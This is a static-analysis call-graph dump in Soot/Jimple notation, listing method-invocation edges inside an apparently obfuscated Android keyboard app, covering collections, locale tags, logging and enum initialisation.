INTERFACE edge: $r1 = interfaceinvoke $r5.<java.util.Map$Entry: java.lang.Object getKey()>() in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
INTERFACE edge: $i0 = interfaceinvoke $r2.<java.util.Comparator: int compare(java.lang.Object,java.lang.Object)>($r3, $r1) in <lmo: int a(java.lang.Object,java.lang.Object)> ==> <lqc: int compare(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke r0.<lid: java.lang.Object getValue()>() in <lid: int hashCode()> ==> <ljb: java.lang.Object getValue()>
VIRTUAL edge: $i0 = virtualinvoke r0.<lqs: int size()>() in <lqs: boolean equals(java.lang.Object)> ==> <lqs: int size()>
INTERFACE edge: $r5 = interfaceinvoke $r6.<java.util.Map$Entry: java.lang.Object getValue()>() in <hbv: void j()> ==> <lki: java.lang.Object getValue()>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(", error index: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r0.<java.lang.Object: boolean equals(java.lang.Object)>($r4) in <lri: boolean a(java.util.Comparator,java.lang.Iterable)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r21.<j$.util.concurrent.r: void <init>(j$.util.concurrent.s)>($r18) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)>
STATIC edge: $r2 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r2, $i0) in <ljd: void t(int)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
VIRTUAL edge: $i1 = virtualinvoke $r7.<java.lang.String: int length()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.String: int length()>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.Map$Entry: java.lang.Object getValue()>() in <lid: boolean equals(java.lang.Object)> ==> <ljb: java.lang.Object getValue()>
SPECIAL edge: specialinvoke $r0.<lso: void <init>()>() in <lsq: void <clinit>()> ==> <lso: void <init>()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(15) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke $r1.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r0) in <lvm: void h(boolean,java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>("ji", "yi") in <ivw: void <clinit>()> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r3 = virtualinvoke $r1.<ljd: java.lang.Object h(int)>($i0) in <ljb: void a()> ==> <ljd: java.lang.Object h(int)>
VIRTUAL edge: $r7 = virtualinvoke $r4.<nzh: java.lang.String c()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: java.lang.String c()>
INTERFACE edge: interfaceinvoke $r9.<lse: void F(java.lang.String,java.lang.Object,java.lang.Object)>("Locale %s has invalid variant: %s", $r0, $r3) in <ivw: ivw d(java.util.Locale)> ==> <lsn: void F(java.lang.String,java.lang.Object,java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r0.<java.lang.String: boolean isEmpty()>() in <lsh: lsh j(java.lang.String)> ==> <java.lang.String: boolean isEmpty()>
VIRTUAL edge: $i1 = virtualinvoke $r7.<lsq: int a()>() in <lsc: void f(java.lang.String,ltn)> ==> <lso: int a()>
STATIC edge: $i6 = staticinvoke <java.lang.Math: int max(int,int)>(1, $i6) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.lang.Math: int max(int,int)>
STATIC edge: $l1 = staticinvoke <java.lang.System: long nanoTime()>() in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.lang.System: long nanoTime()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lkg: void <init>(int)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r12 = virtualinvoke $r6.<lkt: lkx l()>() in <lmb: lme f()> ==> <lkt: lkx l()>
VIRTUAL edge: $r5 = virtualinvoke $r2.<lts: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <lsm: java.lang.Object d(lsz)>
SPECIAL edge: specialinvoke r0.<lsv: void <init>()>() in <lsg: void <init>()> ==> <lsv: void <init>()>
VIRTUAL edge: $z2 = virtualinvoke $r2.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l3, 0, 1) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
SPECIAL edge: specialinvoke $r1.<lvs: void <init>(java.lang.String,int)>("STRING", 1) in <lvs: void <clinit>()> ==> <lvs: void <init>(java.lang.String,int)>
VIRTUAL edge: $i0 = virtualinvoke $r5.<java.lang.String: int length()>() in <ivw: java.lang.String p()> ==> <java.lang.String: int length()>
VIRTUAL edge: $z0 = virtualinvoke r0.<nzh: boolean e()>() in <nzh: boolean f(ivv)> ==> <nzh: boolean e()>
SPECIAL edge: specialinvoke $r3.<lvq: void <init>(lvr,int)>(r0, $i0) in <lvr: java.util.Map$Entry d(java.lang.String,int)> ==> <lvq: void <init>(lvr,int)>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljf: boolean m()>() in <ljf: int b()> ==> <ljf: boolean m()>
STATIC edge: $r0 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r0, $i1) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
SPECIAL edge: specialinvoke $r15.<lvr: void <init>(lvr,lvr)>($r16, $r17) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lvr: void <init>(lvr,lvr)>
SPECIAL edge: $r1 = specialinvoke r0.<ljf: int[] r()>() in <ljf: void l(int)> ==> <ljf: int[] r()>
SPECIAL edge: specialinvoke $r3.<java.util.concurrent.atomic.AtomicInteger: void <init>()>() in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.util.concurrent.atomic.AtomicInteger: void <init>()>
STATIC edge: $i4 = staticinvoke <izw: int ag(int,int,int)>($i2, $i1, $i4) in <ljf: boolean add(java.lang.Object)> ==> <izw: int ag(int,int,int)>
STATIC edge: $z0 = staticinvoke <ivw: boolean A(char)>($c3) in <nzh: boolean f(ivv)> ==> <ivw: boolean A(char)>
INTERFACE edge: $r8 = interfaceinvoke $r9.<lse: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>("com/google/android/libraries/inputmethod/utils/LanguageTag", "fromLocale", 222, "LanguageTag.java") in <ivw: ivw d(java.util.Locale)> ==> <lsn: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>
SPECIAL edge: specialinvoke $r30.<hfd: void <init>(hff,java.lang.Class,ldp)>($r18, class "Ljava/nio/ByteBuffer;", $r19) in <hbw: java.lang.Object a(java.lang.Object)> ==> <hfd: void <init>(hff,java.lang.Class,ldp)>
VIRTUAL edge: $i1 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <j$.util.concurrent.ConcurrentHashMap: int hashCode()>
STATIC edge: $r6 = staticinvoke <lqq: lqq a(int,java.lang.Object[])>(4, $r9) in <lkx: lkx o(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)> ==> <lqq: lqq a(int,java.lang.Object[])>
VIRTUAL edge: $r0 = virtualinvoke $r0.<java.lang.String: java.lang.String concat(java.lang.String)>(" must not be null") in <lvm: java.lang.Object g(java.lang.Object,java.lang.String)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(10) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l0, $i1, $i2) in <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] f()> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
VIRTUAL edge: virtualinvoke r0.<lkh: int b(java.lang.Object[],int)>($r1, 0) in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lql: int b(java.lang.Object[],int)>
STATIC edge: $r1 = staticinvoke <java.util.Arrays: int[] copyOf(int[],int)>($r1, $i0) in <ljd: void t(int)> ==> <java.util.Arrays: int[] copyOf(int[],int)>
SPECIAL edge: specialinvoke $r6.<ltc: void <init>(java.lang.String,int,int)>("NONE", 4, 0) in <ltc: void <clinit>()> ==> <ltc: void <init>(java.lang.String,int,int)>
STATIC edge: $r4 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r4) in <ivw: java.lang.String p()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<java.lang.UnsupportedOperationException: void <init>()>() in <lkh: int c()> ==> <java.lang.UnsupportedOperationException: void <init>()>
SPECIAL edge: $z0 = specialinvoke r0.<lsn: boolean ac()>() in <lsn: void F(java.lang.String,java.lang.Object,java.lang.Object)> ==> <lsn: boolean ac()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r2, $r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>($r3, $l3, $l4, $l5) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Language tag type is set to ") in <ivv: ivw a()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(boolean[],boolean[])>($r18, $r19) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(boolean[],boolean[])>
VIRTUAL edge: $i0 = virtualinvoke $r3.<j$.sun.misc.b: int b(java.lang.Class)>(class "[Lj$/util/concurrent/l;") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: int b(java.lang.Class)>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lje: boolean hasNext()>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.Enum: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <izw: void an(java.lang.Object,int,int)>($r5, $i6, $i1) in <ljf: boolean add(java.lang.Object)> ==> <izw: void an(java.lang.Object,int,int)>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <ljf: java.lang.Object[] s()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <java.util.HashSet: int size()>
SPECIAL edge: specialinvoke $r2.<java.lang.UnsupportedOperationException: void <init>()>() in <lkh: boolean add(java.lang.Object)> ==> <java.lang.UnsupportedOperationException: void <init>()>
STATIC edge: $i1 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i0) in <ljf: void q(int)> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
SPECIAL edge: specialinvoke $r23.<mag: void <init>(java.lang.String,int,int)>("PLAYSTORE_STICKER_IMAGE", 23, 23) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke r0.<java.lang.LinkageError: void <init>()>() in <java.lang.ExceptionInInitializerError: void <init>(java.lang.String)> ==> <java.lang.LinkageError: void <init>()>
SPECIAL edge: specialinvoke r0.<lka: void <init>()>() in <mii: void <init>()> ==> <lka: void <init>()>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lfc: void <init>(lfa)> ==> <iye: java.lang.Object w(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r2) in <ivv: ivw a()> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r11.<mag: void <init>(java.lang.String,int,int)>("EXPRESSIVE_STICKER_METADATA", 11, 11) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<ljd: int size()>() in <ljb: void a()> ==> <ljd: int size()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>("iw", "he") in <ivw: void <clinit>()> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <ljf: int size()>
VIRTUAL edge: $z0 = virtualinvoke $r4.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lta: boolean equals(java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<lwa: void <init>()>() in <lwa: void <clinit>()> ==> <lwa: void <init>()>
INTERFACE edge: $r2 = interfaceinvoke $r0.<java.util.Collection: java.lang.Object[] toArray()>() in <lma: lma p(java.util.Collection)> ==> <ljf: java.lang.Object[] toArray()>
SPECIAL edge: specialinvoke $r0.<lql: void <init>(java.lang.Object[],int)>($r1, 0) in <lql: void <clinit>()> ==> <lql: void <init>(java.lang.Object[],int)>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>("in", "id") in <ivw: void <clinit>()> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<java.util.LinkedHashMap: void <init>(int,float)>($i0, 1.0F) in <ljd: java.util.Map n(int)> ==> <java.util.LinkedHashMap: void <init>(int,float)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<lsp: void <init>(java.lang.String,java.lang.String,int,java.lang.String)>($r0, $r1, $i0, $r2) in <lsq: lsq e(java.lang.String,java.lang.String,int,java.lang.String)> ==> <lsp: void <init>(java.lang.String,java.lang.String,int,java.lang.String)>
VIRTUAL edge: $l3 = virtualinvoke r0.<j$.util.concurrent.ConcurrentHashMap: long l()>() in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ConcurrentHashMap: long l()>
VIRTUAL edge: $z2 = virtualinvoke $r9.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l6, $i2, $i7) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lma: int hashCode()>
STATIC edge: $r3 = staticinvoke <iwt: java.lang.String c(java.lang.String)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <iwt: java.lang.String c(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.UnsupportedOperationException: void <init>()>() in <lkh: int j()> ==> <java.lang.UnsupportedOperationException: void <init>()>
INTERFACE edge: $z0 = interfaceinvoke $r0.<java.util.List: boolean isEmpty()>() in <ivw: java.lang.String[] Q(java.util.List)> ==> <java.util.ArrayList: boolean isEmpty()>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c2) in <ivw: boolean v(java.lang.String)> ==> <ivw: boolean u(char)>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Collection: boolean isEmpty()>() in <lmb: lme f()> ==> <ljf: boolean isEmpty()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(0) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke $r2.<java.util.ConcurrentModificationException: void <init>()>() in <liz: void b()> ==> <java.util.ConcurrentModificationException: void <init>()>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)>($r3, $i2) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)>
VIRTUAL edge: $z0 = virtualinvoke $r0.<java.lang.String: boolean isEmpty()>() in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: boolean isEmpty()>
SPECIAL edge: specialinvoke $r3.<java.lang.AssertionError: void <init>(java.lang.Object)>($r1) in <lvs: lvs a(java.lang.Object)> ==> <java.lang.AssertionError: void <init>(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(10) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lmc: lsa l()>
SPECIAL edge: specialinvoke $r2.<lfc: void <init>(lfa)>($r0) in <iye: lfa p(lfa)> ==> <lfc: void <init>(lfa)>
VIRTUAL edge: virtualinvoke r0.<j$.util.concurrent.q: j$.util.concurrent.l c()>() in <j$.util.concurrent.a: void <init>(j$.util.concurrent.l[],int,int,j$.util.concurrent.ConcurrentHashMap)> ==> <j$.util.concurrent.q: j$.util.concurrent.l c()>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lly: void j(java.lang.Object)> ==> <iye: java.lang.Object w(java.lang.Object)>
STATIC edge: staticinvoke <lsc: void f(java.lang.String,ltn)>("unbounded recursion in log statement", r0) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lsc: void f(java.lang.String,ltn)>
VIRTUAL edge: $i0 = virtualinvoke $r3.<j$.sun.misc.b: int a(java.lang.Class)>(class "[Lj$/util/concurrent/l;") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: int a(java.lang.Class)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <lta: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r4.<qj: java.lang.Object put(java.lang.Object,java.lang.Object)>($r2, $r6) in <ivv: ivw i(java.lang.String)> ==> <qj: java.lang.Object put(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<lkt: void e(int)>($i0) in <lkt: void a(java.lang.Object,java.lang.Object)> ==> <lkt: void e(int)>
STATIC edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r2, $i2, $r12) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
VIRTUAL edge: $r7 = virtualinvoke $r4.<nzh: java.lang.String c()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: java.lang.String c()>
STATIC edge: $r7 = staticinvoke <lma: lma i(int,java.lang.Object[])>($i0, $r6) in <lma: lma w(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object[])> ==> <lma: lma i(int,java.lang.Object[])>
SPECIAL edge: specialinvoke $r4.<j$.util.concurrent.v: void <init>()>() in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <j$.util.concurrent.v: void <init>()>
SPECIAL edge: $r12 = specialinvoke r0.<lvr: java.util.Map$Entry d(java.lang.String,int)>($r10, $i3) in <lvr: void <init>(lvr,lvr)> ==> <lvr: java.util.Map$Entry d(java.lang.String,int)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lid: java.lang.Object getKey()>() in <lid: boolean equals(java.lang.Object)> ==> <ljb: java.lang.Object getKey()>
STATIC edge: $r5 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOfRange(java.lang.Object[],int,int)>($r2, $i1, $i0) in <ojg: void g(java.lang.Throwable,java.lang.String)> ==> <java.util.Arrays: java.lang.Object[] copyOfRange(java.lang.Object[],int,int)>
SPECIAL edge: specialinvoke r0.<java.lang.ThreadLocal: void <init>()>() in <j$.util.concurrent.v: void <init>()> ==> <java.lang.ThreadLocal: void <init>()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <java.lang.String: void <init>(char[])> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r30.<java.lang.StringBuilder: void <init>()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r3, "logSiteKey") in <lsn: boolean ac()> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
VIRTUAL edge: virtualinvoke $r4.<nzh: void d()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: void d()>
SPECIAL edge: specialinvoke r0.<ltf: void <init>(lto)>($r1) in <lth: void <init>(lto)> ==> <ltf: void <init>(lto)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lqr: int hashCode()>
VIRTUAL edge: $r0 = virtualinvoke $r0.<java.lang.String: java.lang.String concat(java.lang.String)>(" must not be null") in <ojg: void c(java.lang.Object,java.lang.String)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lkt: void <init>(int)> ==> <java.lang.Object: void <init>()>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r0, $i1, $r1, $i0, $i2) in <nvw: void j(int[],int[],int,int,int)> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
STATIC edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r2, $i7, $r10) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(6) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lmb: lme f()> ==> <liz: boolean hasNext()>
INTERFACE edge: $z0 = interfaceinvoke $r2.<java.util.List: boolean isEmpty()>() in <ivv: int h()> ==> <java.util.ArrayList: boolean isEmpty()>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.StringBuilder: java.lang.String toString()>() in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<lkq: int size()>() in <lkm: void <init>(lkq,int)> ==> <lqm: int size()>
SPECIAL edge: specialinvoke $r2.<lsk: void <init>(java.lang.Class)>(class "Llvt;") in <lsl: void <clinit>()> ==> <lsk: void <init>(java.lang.Class)>
SPECIAL edge: specialinvoke $r5.<java.util.WeakHashMap: void <init>()>() in <hcb: void <init>()> ==> <java.util.WeakHashMap: void <init>()>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(5) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljd: int d(int)>($i0) in <ljd: java.util.Map m()> ==> <ljd: int d(int)>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean f(ivv)>(r0) in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean f(ivv)>
STATIC edge: staticinvoke <java.lang.Thread: void yield()>() in <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] f()> ==> <java.lang.Thread: void yield()>
SPECIAL edge: specialinvoke $r0.<java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>("initialized", $r1) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>
SPECIAL edge: specialinvoke r0.<liz: void <init>(ljd)>($r1) in <liw: void <init>(ljd)> ==> <liz: void <init>(ljd)>
VIRTUAL edge: $r7 = virtualinvoke r0.<ljd: java.lang.Object j()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: java.lang.Object j()>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljd: int c()>() in <ljd: java.util.Map m()> ==> <ljd: int c()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorFeaturedMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
SPECIAL edge: specialinvoke $r1.<jlu: void <init>(int)>(9) in <lvt: void <clinit>()> ==> <jlu: void <init>(int)>
STATIC edge: $i6 = staticinvoke <java.lang.Math: int min(int,int)>(1073741823, $i6) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.lang.Math: int min(int,int)>
STATIC edge: $l0 = staticinvoke <android.os.SystemClock: long elapsedRealtime()>() in <com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <clinit>()> ==> <android.os.SystemClock: long elapsedRealtime()>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lvt: boolean equals(java.lang.Object)>
SPECIAL edge: $i4 = specialinvoke r0.<ljd: int z(int,int,int,int)>($i4, $i5, $i3, $i0) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: int z(int,int,int,int)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lid: int hashCode()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkx: lma g()>() in <lkx: lma q()> ==> <lqq: lma g()>
SPECIAL edge: specialinvoke $r2.<j$.sun.misc.b: void <init>(sun.misc.Unsafe)>($r4) in <j$.sun.misc.b: void <clinit>()> ==> <j$.sun.misc.b: void <init>(sun.misc.Unsafe)>
STATIC edge: $r1 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/apps/inputmethod/libs/framework/core/AppBase") in <com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>($i0, null, null) in <j$.util.concurrent.g: void <init>(j$.util.concurrent.l[])> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<lts: lsz c(int)>($i1) in <lsd: boolean b(lsr)> ==> <ltr: lsz c(int)>
STATIC edge: $z0 = staticinvoke <lri: boolean V(java.util.List,java.lang.Object)>(r0, $r1) in <lkq: boolean equals(java.lang.Object)> ==> <lri: boolean V(java.util.List,java.lang.Object)>
STATIC edge: $r3 = staticinvoke <lma: lma r(java.lang.Object)>($r5) in <lly: lma g()> ==> <lma: lma r(java.lang.Object)>
SPECIAL edge: $z0 = specialinvoke r0.<ivw: boolean P()>() in <ivw: boolean equals(java.lang.Object)> ==> <ivw: boolean P()>
STATIC edge: staticinvoke <izw: void as(int,java.lang.String)>($i0, "initialCapacity") in <lkg: void <init>(int)> ==> <izw: void as(int,java.lang.String)>
SPECIAL edge: specialinvoke $r20.<mag: void <init>(java.lang.String,int,int)>("NATIVE_CARD", 20, 20) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
STATIC edge: $r1 = staticinvoke <lum: lto d(java.lang.String)>($r2) in <lth: lth i(java.lang.String)> ==> <lum: lto d(java.lang.String)>
VIRTUAL edge: $r18 = virtualinvoke r0.<lsn: lsc c()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lsf: lsc c()>
STATIC edge: $r1 = staticinvoke <iwt: java.lang.String d(java.lang.String)>($r1) in <ivv: void g(java.lang.String)> ==> <iwt: java.lang.String d(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Enum: void <init>(java.lang.String,int)>($r1, $i0) in <ltc: void <init>(java.lang.String,int,int)> ==> <java.lang.Enum: void <init>(java.lang.String,int)>
VIRTUAL edge: virtualinvoke $r6.<lkt: void a(java.lang.Object,java.lang.Object)>($r3, $r11) in <lmb: lme f()> ==> <lkt: void a(java.lang.Object,java.lang.Object)>
